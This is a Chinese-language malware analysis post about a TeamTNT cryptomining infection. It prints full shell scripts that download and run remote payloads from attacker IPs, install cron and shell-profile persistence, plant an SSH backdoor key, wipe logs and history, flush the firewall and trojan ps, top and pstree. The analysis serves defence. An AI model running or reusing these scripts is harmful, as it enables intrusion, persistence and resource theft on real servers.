author：sky11ne

前言：
---

某天，在群里吹水，然后甲方兄弟扔了张图~

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5ac624c03ea7c39506a3642162712ff2a7700650.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5ac624c03ea7c39506a3642162712ff2a7700650.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-18bdbdadf22a9070e310939eafe0372d79738045.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-18bdbdadf22a9070e310939eafe0372d79738045.png)

深知甲方兄弟的不易，所以有了下文~

### a.sh 分析

```bash
#!/bin/bash
echo "ok22$(date)" >>/tmp/ok.log        #将当前时间输出到tmp目录下，记录当前时间
export CURL_CMD="curl"                          #将curl添加到系统变量
if [ -f /bin/cd1 ];then                         #这个if检测bin目录下是否存在下载命令，存在则添加到系统变量
    export CURL_CMD="/bin/cd1" 
elif [ -f /bin/cur ];then
    export CURL_CMD="/bin/cur" 
elif [ -f /bin/TNTcurl ];then
    export CURL_CMD="/bin/TNTcurl" 
elif [ -f /bin/curltnt ];then 
    export CURL_CMD="/bin/curltnt" 
elif [ -f /bin/curl1 ];then
    export CURL_CMD="/bin/curl1" 
elif [ -f /bin/cdt ];then
    export CURL_CMD="/bin/cdt" 
elif [ -f /bin/xcurl ];then
    export CURL_CMD="/bin/xcurl"  
elif [ -x "/bin/cdz" ];then
    export CURL_CMD="/bin/cdz"
fi 
sh_url="http://104.192.82.138/s3f1015"              #将木马网址添加到sh_url变量
export MOHOME=/var/tmp/.crypto/...                      #将该目录添加到系统变量，这个目录为木马日志存放的位置
if [ -f ${MOHOME}/.ddns.log ];then                      #这个if大概意思是检测主机是否存有上一次的日志文件
    echo "process possible running"                     #如果存在，则这台主机可能正在运行挖矿木马
    current=$(date +%s)                                             #将时间转化成整数形式
    last_modified=$(stat -c "%Y" ${MOHOME}/.ddns.log)       #获取日志文件最后一次修改时间
    if [ $(($current-$last_modified)) -gt 6 ];then          #这个if判断日志文件修改时间是否大于6
        echo "process is not running"                                       #如果大于6，那么进程可能不在运行
    else                                                                #如果小于6，则下载新的文件，修改为.ddns.pid去运行
        ${CURL_CMD} -fsSL -o ${MOHOME}/.ddns.pid ${sh_url}/m/reg0.tar.gz
        exit 0                  #如果存在上一次的挖矿日志则直接跳出  
    fi
fi
if [ "$(id -u)" == "0" ];then                                               #这个if判断当前登陆id是否为root用户
    ${CURL_CMD} -fsSL ${sh_url}/a/ar.sh |bash               #是root用户，则下载ar.sh文件
else
    ${CURL_CMD} -fsSL ${sh_url}/a/ai.sh |bash               #不是root用户，则下载ai.sh文件
fi
```

#### 大体逻辑：

[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7ebaf72e97b56d7316a1ee00fa69afd5141ef8dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7ebaf72e97b56d7316a1ee00fa69afd5141ef8dc.png)

### ai.sh 分析

根据上个脚本的***大体逻辑***，我们先来分析不是root的情况，大体逻辑如下：

1-36行：将存在的命令添加到系统变量

37行：去除包含grep的进程行，杀掉内存占用率大于65的进程

39-43行：删除文件，清除历史记录，使用chattr +i保护文件

45行：如果当前的shell不是bash，则删除

47-50行：删除var下的log和mail文件

52-58行：将需要的链接添加到变量

59行：钱包地址

61-84行：关闭docker容器，删除docker镜像

86-97行：解除文件保护，删除原有定时任务，添加恶意定时任务

98-138行：过滤某些特定计划任务，然后删除

139-147行：使用保护程序保护计划任务

148-164行：创建公私钥，写入公钥

165-175行：将下载脚本写入**bashrc和profile**文件，使得系统启动和用户登陆时自动运行脚本

177-192行：是TeamTNT家族标志，一点都不避人 ：）

195行：运行149-175行创建的函数

197-202行：创建.psla文件，看echo应该是：如果这个文件存在，则证明这台服务器已经被入侵

205-211行：创建目录，下载挖矿程序并保存为httpd-w，运行挖矿程序

212行：清除历史命令

214行：正常退出程序

```bash
#!/bin/bash 

export CHATTR="chattr"
if [ -f /bin/tntcht ];then
    export CHATTR="/bin/tntcht" 
elif [ -f /bin/tntrecht ];then
    export CHATTR="/bin/tntrecht"
fi   
export WGET_CMD="wget"  
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /bin/wgettnt ];then
    export WGET_CMD="/bin/wgettnt" 
elif [ -f /bin/TNTwget ];then
    export WGET_CMD="/bin/TNTwget" 
elif [ -f /bin/wge ];then
    export WGET_CMD="/bin/wge" 
elif [ -f /bin/wd1 ];then
    export WGET_CMD="/bin/wd1"
elif [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1" 
elif [ -f /bin/wdt ];then
    export WGET_CMD="/bin/wdt" 
elif [ -f /bin/xget ];then
    export WGET_CMD="/bin/xget" 
elif [ -x "/bin/wdz" ];then
    export WGET_CMD="/bin/wdz"
elif [ -x "/usr/bin/wdz" ];then
    export WGET_CMD="/usr/bin/wdz"
fi  
export PS_CMD="ps"
if [ -f "/bin/ps.original" ];then
    export PS_CMD="/bin/ps.original"
elif [ -f "/bin/ps.lanigiro" ];then
    export PS_CMD="/bin/ps.lanigiro"
fi 
kill $(ps aux|grep -v grep|awk '{if($3>65.0) print $2}') 2>/dev/null

rm -fr /dev/shm/dia/ 2>/dev/null 1>/dev/null
rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
${CHATTR} +i ~/.bash_history 2>/dev/null 1>/dev/null
clear
if [[ "$0" != "bash" ]]; then rm -f $0; fi

cat /dev/null >/var/spool/mail/root 2>/dev/null
cat /dev/null >/var/log/wtmp 2>/dev/null
cat /dev/null >/var/log/secure 2>/dev/null
cat /dev/null >/var/log/cron 2>/dev/null

MOxmrigMOD=http://112.253.11.38/mid.jpg
MOxmrigSTOCK=http://112.253.11.38/mid.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
sh_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.zookp8
VERSION=2.9
if [ $(command -v docker) ];then
    docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
fi
sh_url="http://104.192.82.138/s3f1015"
function clean_cron(){
    ${CHATTR} -R -ia /var/spool/cron 
    ${CHATTR} -ia /etc/crontab 
    ${CHATTR} -R -ia /etc/cron.d 
    ${CHATTR} -R -ia /var/spool/cron/crontabs 
    crontab -r
    (
        crontab -l 2>/dev/null
        echo "*/30 * * * * ${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash > /dev/null 2>&1"
    ) | crontab - 
} 
clean_cron
crontab -l | sed '/base64/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
crontab -l | sed '/aliyun.one/d' | crontab -
crontab -l | sed '/3.215.110.66.one/d' | crontab -
crontab -l | sed '/pastebin/d' | crontab -
crontab -l | sed '/onion/d' | crontab -
crontab -l | sed '/lsd.systemten.org/d' | crontab -
crontab -l | sed '/shuf/d' | crontab -
crontab -l | sed '/ash/d' | crontab -
crontab -l | sed '/mr.sh/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/localhost.xyz/d' | crontab -
crontab -l | sed '/45.137.151.106/d' | crontab -
crontab -l | sed '/111.90.159.106/d' | crontab -
crontab -l | sed '/github/d' | crontab -
crontab -l | sed '/bigd1ck.com/d' | crontab -
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -
crontab -l | sed '/newdat.sh/d' | crontab -
crontab -l | sed '/lib.pygensim.com/d' | crontab -
crontab -l | sed '/t.amynx.com/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/systemd-service.sh/d' | crontab -
crontab -l | sed '/pg_stat.sh/d' | crontab -
crontab -l | sed '/sleep/d' | crontab -
crontab -l | sed '/oka/d' | crontab -
crontab -l | sed '/linux1213/d' | crontab -
crontab -l | sed '/zsvc/d' | crontab -
crontab -l | sed '/_cron/d' | crontab -
crontab -l | sed '/31.210.20.181/d' | crontab -
function lock_cron()
{
    ${CHATTR} -R +ia /var/spool/cron 
    touch /etc/crontab
    ${CHATTR} +ia /etc/crontab 
    ${CHATTR} -R +ia /var/spool/cron/crontabs 
    ${CHATTR} -R +ia /etc/cron.d 
} 
lock_cron    
sname=$(whoami)  
function makesshaxx(){  
    RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm2krFRMHvJfXs2x2yYEterNauzo2NCqSarLQZAtVVQ0hT/uPF1ytWMWy7/bjhgZpTnIqfofLXEx1IAA9K+UyOE3NSK63YhQYlwBSJSi+mNMYx80r5P7seo+JUeW9Vr12M4BWg7VMGn6VZevo+OVBAcX3z7MPMkLNPzNycFU7SOfSMam2cm/99xlVGeYi9QZ1W/fypsmyoDSvVuppQe05VkMx/umFuWeSrI47dab4+dfxQuS1e+7/8rSqSD57YLY9qW+o/yl/K2FJ7sZg3XsGplhiNC8RHMFF8pNh16TLZb3m7Jx+x4Xtjf82B2YmoszD+2hqKeSo8c5BcDgrJSVrhIhvQ0nrFtIi8rZsZQafyEkQXZOeTgH79f59/yeJuB1IP4zYkMrJP5Gt9rqTImz6wF7d87pBfPnXFUGFZDT3e+Kbe+fpYOb6CRZmWur0gTenocN2xiRw7neTT6uZcbp1D3ICAqfUmLunZHW6dK6IoiCs7A6y5fHk1hxBJY7x1UA0= ${sname}@pending.com"

    mkdir ${HOME}/.ssh/ -p  
    ${CHATTR} -ia ${HOME}/.ssh/authorized_keys
    touch ${HOME}/.ssh/authorized_keys  
    chmod 600 ${HOME}/.ssh/authorized_keys 
    grep  ${sname}@pending.com ${HOME}/.ssh/authorized_keys 
    grep -q ${sname}@pending.com ${HOME}/.ssh/authorized_keys || echo $RSAKEY > ${HOME}/.ssh/authorized_keys
    ${CHATTR}  +ia ${HOME}/.ssh/authorized_keys

    ${CHATTR} -ia ${HOME}/.ssh/authorized_keys2
    touch ${HOME}/.ssh/authorized_keys2  
    chmod 600 ${HOME}/.ssh/authorized_keys2  
    grep -q ${sname}@pending.com ${HOME}/.ssh/authorized_keys2 || echo $RSAKEY > ${HOME}/.ssh/authorized_keys2
    ${CHATTR} +ia ${HOME}/.ssh/authorized_keys2 
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" ${HOME}/.profile > /dev/null;then
        echo "{" >>${HOME}/.profile
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>${HOME}/.profile
        echo "} > /dev/null 2>&1" >> ${HOME}/.profile
    fi  
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" ${HOME}/.bashrc > /dev/null;then
        echo "{" >> ${HOME}/.bashrc
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>${HOME}/.bashrc
        echo "} > /dev/null 2>&1" >> ${HOME}/.bashrc
    fi 
}    

######################### printing greetings ###########################
echo -e " "
echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
echo -e " "
echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
echo -e " "
echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
echo " "
echo " "

## now the bad part of the script###

makesshaxx 

if [ ! -f "/var/tmp/.psla" ]; then 
    echo 'lockfile' > /var/tmp/.psla
    ${CHATTR} +i /var/tmp/.alsp
else
  echo "replay .. i know this server ..."
fi 

export MOHOME="/var/tmp/..."
mkdir -p ${MOHOME}
${WGET_CMD}  -q --tries=3 --timeout=10 -O ${MOHOME}/httpd-w ${sh_url}/s/w.0.tar.gz
chmod a+x ${MOHOME}/httpd-w
cd ${MOHOME}  

./httpd-w 2>/dev/null 1>/dev/null 
history -c

exit 0

## now the bad part of the script###
```

#### w.0.tar.gz （httpd-w）文件分析

将文件拖进IDA，反编译失败，貌似所有的程序都带有upx壳，所以down下来后都要工具脱一遍壳，然后再拖进IDA查看。

![image-20211201162448524](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3039d865eb902996d13614bf2b32a8c4faa77a1c.png)

脱壳后的文件查看main函数，这里主要进行了两个判断，是否存在当前文件，当前用户是否为root

***步骤1***：下载第一个脚本运行

***步骤2***：下载第二个脚本运行

***步骤3***：以特权模式启动一个docker

![image-20211202110553400](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4aca99c9de08fb44047800077e63c2f5f5e9cd33.png)

#### 步骤1：m.0.tar.gz 文件分析

首先来运行一波~，通过ps命令发现，主要是去github上下载了挖矿程序，程序地址和之前云鼎实验室捕捉到的一样。

![image-20211202101606837](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4d16a237692693e1ce9870fa3a3234bb3df77229.png)

随后去运行了这个程序解压出来的程序。

![image-20211202102002362](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3db91c6e69e5ac7a8765e72ff48e5fc96a938e6.png)

通过top命令查看，发现cpu利用率已经拉满了：）

![image-20211202101751522](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c299e53f206dae9c1429ccf5c8c53bfe81de7919.png)

##### 脱壳分析

其中主要是初始化一些变量，然后赋值去执行。但是我们没发现它去下载挖矿程序的地址，跟进一下`check_task()`函数看一下。

![image-20211202102649741](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1dd380f6c8f939cf268adc6da8b9d0e36e2689f9.png)

##### check\_task()函数

这个函数中还包括了downloads()函数，清除一些变量环境，我们在跟进一下downloads()函数。

![image-20211202102721866](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ed2aec823453184fb168849618ac4a7c438bad3.png)

##### downloads()函数

这个函数中主要包括了去下载挖矿程序，各种备用程序地址，清环境、给程序权限，来运行挖矿程序。

![image-20211202102932602](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4eb1366e7725ec9d04b54286f0920cb7dfa666e5.png)

![image-20211202103022142](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7487212cef4bce40685c5a17271607d9f871164d.png)

![image-20211202103046606](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-222dd93a44c83f9f9141b6779465b7f44cca004b.png)

github上的挖矿程序基本上都是反编译的，不信下下来看看~，果然

![image-20211202152711800](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eac97011c566908d6b65474f6a823f08c8169ca6.png)

那我们来运行一波~ 发现了公共矿池地址：donate.v2.xmrig.com:3333

![image-20211202154907940](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee944ea50cf31c8cb6f1c52ed045e3f12656b182.png)

也可以通过修改`config.json`文件修改矿池地址和你的钱包。

![image-20211202155227837](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-38af5316cf51d95ae2139590332c15c00991b089.png)

其中，在sh脚本中添加的`cf.jpg`文件其实是此次挖矿程序的矿池地址和钱包地址。

![image-20211202160002129](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4b0c830e391b3a2b623bf6b477f5227603aa7af9.png)

可以看到，截止本文编辑时间，还有四个挖矿程序在工作。

![image-20211202160225779](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3931eb7f2c2cb6bd944f23703c8f019db1fe9b0c.png)

#### 步骤2：s.tar.gz 文件分析

先来运行一下，通过ps看到下载了一个符合当前服务器架构的程序，然后伪装成`system-xfwm4-session`文件去运行。

![image-20211202104742951](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4cd14b8d726310e3b545212bcd5ca590b9ec10b0.png)

![image-20211202104759336](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cefbb1ec490e8cd4ec328f2c1902e5cf064ce675.png)

通过top命令查看，发现这个程序cpu利用率很低，但是虚拟内存全部拉满了。

![image-20211202112321764](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4f4ce4406e238c5f60e7dd9a8a5546900df8640b.png)

##### 脱壳分析

主要是根据服务器架构，下载了对应的`htx.i.&arch`程序，然后伪装成`system-xfwm4-session`去运行。

![image-20211201192640520](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-567dcae78161181877d16775ecba24b7a3badb9b.png)

![image-20211201201843931](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5bd4703f4662f7a01174e6599eb6b0b92dba1c42.png)

![image-20211201193000440](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1318f604e3f05ea7d47b761e11204965ccb01e7d.png)

##### htx.i.x86\_64 文件分析

接下来，把伪装程序`system-xfwm4-session`下载后分析。

![image-20211201202050408](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f0fcc69aeb41f5c0d834b376c0d43fbb5282045.png)

也是upx壳。

![image-20211201193833906](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e1cfd2bdce7dbe2a20b91506aa1043dcd892caba.png)

发现这个程序加了代码混淆，分析受阻 =，=

![image-20211201211750547](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db73528d2ebe47fef6f33de1efc84cda2ae7aa62.png)

随后扔到微步云沙箱去运行，竟然全绿。。。

![image-20211201194714884](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9c2102566865b4393f0fbc15b852226f9e38ba8.png)

扔到qax沙箱中看看，然后报毒了。

![image-20211202142440156](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-914a27bb3c0e7b69a73bc9a397593cd7ff624f3d.png)

显示有大量的连接。

![image-20211202142615803](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9f009c6efa64547759d86067354a848626015d63.png)

那只有通过抓包来看看流量了，因为程序无法逆向，感觉是在连接我的主机，然后来扫描其他机器，来扩大战果。

![image-20211202113931029](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68dbbb2316185aceb1e0833c5c8803947ab11db3.png)

#### 步骤3：以特权模式运行docker

这里查找资料后发现与腾讯云鼎实验室捕获的样本高度类似，下面是文章链接：

<https://cloud.tencent.com/developer/article/1890593?from=article.detail.1828407>

下图镜像为`alpine`，这一ID在上面的文章中也曾出现，该用户账号注册时间为2021年8月15日，其中docker72590/alpine更新时间截止目前只有11天，大概有5400台主机被感染。

![image-20211201164804418](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e0b92d07e860ed788ad9cacdb05c70612787b028.png)

### ar.sh 分析

如果当前登陆的是root用户，那么a.sh文件就会去下载ar.sh文件去执行。

查看脚本发现，ar.sh比ai.sh多了一些命令，例如：设置最大链接数、放通防火墙、修改shadow文件、杀掉其他家族的程序等一系列root权限才可以操作的命令。

但最后还是运行了`w.0.tar.gz`这个文件，和普通用户一样。

然而`${CURL_CMD} -sLk ${sh_url}/sh/dia.sh`这个脚本我去尝试下载，好像不存在 = ，=（不知道是不是大意了）

```bash
#!/bin/bash
#
#       TITLE:          MonerooceanMiner-Installer
#       AUTOR:          hilde@teamtnt.red
#       VERSION:        V1.00.0
#       DATE:           13.09.2021
#
#       SRC:        http://teamtnt.red/sh/setup/moneroocean_miner.sh
#
########################################################################

ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
export CHATTR="/bin/chattr"
if [ -f /bin/tntcht ];then
    export CHATTR="/bin/tntcht" 
elif [ -f /bin/tntrecht ];then
    export CHATTR="/bin/tntrecht"
fi  
if [ ! ${CHATTR} == "/bin/tntcht" ];then
    mv ${CHATTR} /bin/tntcht
    export CHATTR="/bin/tntcht"
fi 
export WGET_CMD="/bin/wget"  
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /bin/wgettnt ];then
    export WGET_CMD="/bin/wgettnt" 
elif [ -f /bin/TNTwget ];then
    export WGET_CMD="/bin/TNTwget" 
elif [ -f /bin/wge ];then
    export WGET_CMD="/bin/wge" 
elif [ -f /bin/wd1 ];then
    export WGET_CMD="/bin/wd1"
elif [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1" 
elif [ -f /bin/wdt ];then
    export WGET_CMD="/bin/wdt" 
elif [ -f /bin/xget ];then
    export WGET_CMD="/bin/xget" 
elif [ -x "/bin/wdz" ];then
    export WGET_CMD="/bin/wdz"
elif [ -x "/usr/bin/wdz" ];then
    export WGET_CMD="/usr/bin/wdz"
else 
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
fi 
if [ ! ${WGET_CMD} == "/bin/wdz" ];then
    mv ${WGET_CMD} /bin/wdz
    WGET_CMD="/bin/wdz" 
fi 
if [ ! ${CURL_CMD} == "/bin/cdz" ];then
    mv ${CURL_CMD} /bin/cdz
    CURL_CMD="/bin/cdz" 
fi  

export PS_CMD="/bin/ps"
pssize=$(ls -l /bin/ps | awk '{ print $5 }') 
${CHATTR} -i /bin/ps
if [ ${pssize} -le 8000 ];then 
    ps_name=$(awk '/\$@/ {print $1}' /bin/ps)  
    if [ ! "${ps_name}" = "ps.lanigiro" ];then
        mv /bin/${ps_name} /bin/ps.lanigiro
    fi
else 
    mv /bin/ps /bin/ps.lanigiro 
fi 
echo "#!/bin/bash">/bin/ps
echo "ps.lanigiro \$@ | grep -v 'ddns\|httpd'" >>/bin/ps 
touch -d 20160825 /bin/ps
chmod a+x /bin/ps
${CHATTR} +i /bin/ps  
if [ -x /bin/ps.lanigiro ];then
    PS_CMD="/bin/ps.lanigiro"
fi
topsize=`ls -l /bin/top | awk '{ print $5 }'`
${CHATTR} -i /bin/top
if [ ${topsize} -le 8000 ];then  
    top_name=$(awk '/\$@/ {print $1}' /bin/top)
    if [ ! "${top_name}" = "top.lanigiro" ];then
        mv /bin/${top_name} /bin/top.lanigiro
    fi
else 
    mv /bin/top /bin/top.lanigiro
fi
echo "#!/bin/bash">/bin/top 
echo "top.lanigiro \$@ | grep -v 'ddns\|httpd'">>/bin/top 
chmod a+x /bin/top
touch -d 20160716 /bin/top
${CHATTR} +i /bin/top 
treesize=`ls -l /bin/pstree| awk '{ print $5 }'`
${CHATTR} -i /bin/pstree
if [ ${treesize} -le 8000 ];then  
    tree_name=$(awk '/\$@/ {print $1}' /bin/pstree)
    if [ ! "${tree_name}" = "pstree.lanigiro" ];then
        mv /bin/${tree_name} /bin/pstree.lanigiro 
    fi
else  
    mv /bin/pstree /bin/pstree.lanigiro
fi 
echo "#!/bin/bash">/bin/pstree
echo "pstree.lanigiro \$@ | grep -v 'ddns\|httpd'">>/bin/pstree
chmod +x /bin/pstree
touch -d 20161121 /bin/pstree 
${CHATTR} +i /bin/pstree 
if [ ${CURL_CMD} == "/bin/curl" ];then
    mv ${CURL_CMD} /bin/cdz
    CURL_CMD="/bin/cdz"
elif [ ${CURL_CMD} == "/usr/bin/curl" ];then
    mv ${CURL_CMD} /usr/bin/cdz
    CURL_CMD="/usr/bin/cdz"
fi

function CLEANUP_BY_TEAMTNT(){
    echo IyEvYmluL2Jhc2gKIwojICAgICAgIFRJVExFOiAgICAgICAgICBMRC5QUkVMT0FELkNMRUFORVIKIyAgICAgICBBVVRPUjogICAgICAgICAgaGlsZGVAdGVhbXRudC5yZWQKIyAgICAgICBWRVJTSU9OOiAgICAgICAgVjMuMTAuMAojICAgICAgIERBVEU6ICAgICAgICAgICAxNC4wOS4yMDIxCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpleHBvcnQgTENfQUxMPUMuVVRGLTggMj4vZGV2L251bGwgMT4vZGV2L251bGwKZXhwb3J0IExBTkc9Qy5VVEYtOCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApISVNUQ09OVFJPTD0iaWdub3Jlc3BhY2Uke0hJU1RDT05UUk9MOis6JEhJU1RDT05UUk9MfSIgMj4vZGV2L251bGwgMT4vZGV2L251bGwKZXhwb3J0IEhJU1RGSUxFPS9kZXYvbnVsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApISVNUU0laRT0wIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnVuc2V0IEhJU1RGSUxFIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOi92YXIvYmluOi9iaW46L3NiaW46L3Vzci9zYmluOi91c3IvYmluCgpmdW5jdGlvbiBEQVRFSV9FTlRGRVJORU4oKXsKICAgICAgICBaSUVMREFURUk9JDEgCiAgICAgICAgdG50Y2h0IC1pYSAkWklFTERBVEVJIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIAogICAgICAgIGNobW9kIDE3NzcgJFpJRUxEQVRFSSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAogICAgICAgIHJtIC1mciAkWklFTERBVEVJIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCn0gCmVjaG8gLWUgIlxuXG5cMDMzWzA7MzNtIFByw7xmZSBwcmVsb2FkZsOkaGlnZSBEYXRlaTpcbiB+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flwwMzNbMG0iCgppZiBbIC1mICIvZXRjL2xkLnNvLnByZWxvYWQiIF07IHRoZW4gCmVjaG8gLWUgIiBcZVsxOzMzOzQxbS9ldGMvbGQuc28ucHJlbG9hZCBnZWZ1bmRlblwwMzNbMG0iO2VjaG8gLWUgIiBcMDMzWzA7MzNtKHByw7xmZSBhdWYgZW50aGFsdGVuZSBEYXRlaWVuKVwwMzNbMG0iClBSRUxPQURfREFURUlfVkFSPSQoY2F0IC9ldGMvbGQuc28ucHJlbG9hZCkKCmlmIFsgLXogIiRQUkVMT0FEX0RBVEVJX1ZBUiIgXTsgdGhlbiAKZWNobyAtZSAiXDAzM1swOzMybSBLZWluZSBEYXRlaXZlcndlaXNlIGVudGhhbHRlbi5cMDMzWzBtIjtlY2hvIC1lICJcMDMzWzA7MzJtIExlZXJlIERhdGVpIHdpcmQgZW50ZmVybnQuXDAzM1swbSIKREFURUlfRU5URkVSTkVOIC9ldGMvbGQuc28ucHJlbG9hZAplbHNlCgpmb3IgUFJFTE9BRF9EQVRFSSBpbiAke1BSRUxPQURfREFURUlfVkFSW0BdfTsgZG8KaWYgWyAtZiAiJFBSRUxPQURfREFURUkiIF07IHRoZW4gCmVjaG8gLWUgIiBcZVsxOzMzOzQxbSRQUkVMT0FEX0RBVE